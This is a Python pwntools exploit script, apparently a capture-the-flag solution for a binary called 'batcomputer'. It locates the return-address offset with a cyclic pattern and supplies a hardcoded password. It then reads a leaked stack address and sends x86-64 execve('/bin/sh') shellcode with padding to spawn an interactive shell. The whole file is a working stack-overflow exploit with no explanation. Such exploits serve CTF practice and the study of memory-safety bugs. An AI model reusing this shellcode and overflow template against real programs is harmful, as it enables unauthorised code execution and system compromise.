from pwn import *
import pprint
exe = './batcomputer/batcomputer'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
pprint.pprint(rop.gadgets)
#context.log_level = 'debug'
def findoffset(path,size,after):
    #target=process(path, stdin=PTY, stdout=PTY, stderr=PTY)
    target=process(path)
    target.sendlineafter('>','2')
    target.sendlineafter(':','b4tp@$$w0rd!')
    target.sendlineafter(':', cyclic(size))
    target.sendlineafter('>', '12')
    target.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(target.corefile.rbp)+8 # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset
#findoffset(exe,100,'>>')
shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05") # 23B // From shellstrorm
target=process(exe)
target.sendlineafter('>','1')
line = target.sendlineafter('>','2')
addrs= p64(int(line.split()[10], 16))
payload =  shellcode + b'a' * 61 + addrs # 84 offset - 23 shellcode = 61
info(payload)
target.sendlineafter(':','b4tp@$$w0rd!')
target.sendlineafter(':', payload)
target.sendlineafter('>', '12')
target.interactive()
